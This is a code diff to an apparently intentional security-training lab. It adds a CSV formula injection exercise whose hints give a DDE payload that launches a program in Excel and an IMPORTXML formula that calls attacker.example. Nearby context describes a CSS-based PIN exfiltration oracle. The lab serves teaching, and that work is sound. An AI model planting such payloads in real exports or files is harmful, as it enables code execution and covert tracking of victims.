@@ -277,6 +277,19 @@ CATEGORIES.append(
                     "A real attacker doesn't know the PIN in advance. They inject ten rules at once -- one per candidate digit 0 through 9, each pointing at a differently-labeled collector URL -- and whichever request actually arrives reveals the correct first digit. Repeating this, extending the confirmed prefix by one digit each round, recovers the entire PIN purely from which background-image requests fire, exactly the same character-by-character oracle pattern as this lab's blind SQL and LDAP injection examples.",
                 ],
             ),
+            ExampleNav(
+                id="csv-formula-injection",
+                title="CSV Formula Injection via Comment Export",
+                group="CSV Injection",
+                difficulty="Medium",
+                endpoint="a03_injection.csv_injection",
+                hints=[
+                    "This comment feature can export all comments to a CSV file for download -- a common real-world feature. Look at how each comment's author and body get written into that export: is there any check on what characters a cell is allowed to start with?",
+                    "Spreadsheet applications like Excel and Google Sheets treat a cell starting with =, +, -, or @ as a FORMULA to evaluate the instant the file is opened, not as plain text. Post a comment with body =1+1, export the CSV, and open the raw file -- the cell contains the literal text =1+1 with no neutralizing prefix added.",
+                    "Escalate from a harmless proof to real code execution: post a comment with body =cmd|'/C calc'!A0 (a Dynamic Data Exchange payload). Opened in a DDE-enabled version of Excel, this spawns Calculator the moment the victim accepts the workbook's external-data-update prompt.",
+                    "Google Sheets has no such prompt to click through. Post a comment with body =IMPORTXML(\"http://attacker.example/track\", \"//a/@href\") -- viewing this cell in Google Sheets silently fires a real outbound HTTP request to the attacker's server, confirming the payload landed with zero user interaction beyond opening the file.",
+                ],
+            ),
         ],
         seed_fn=seed_injection_data,
     )
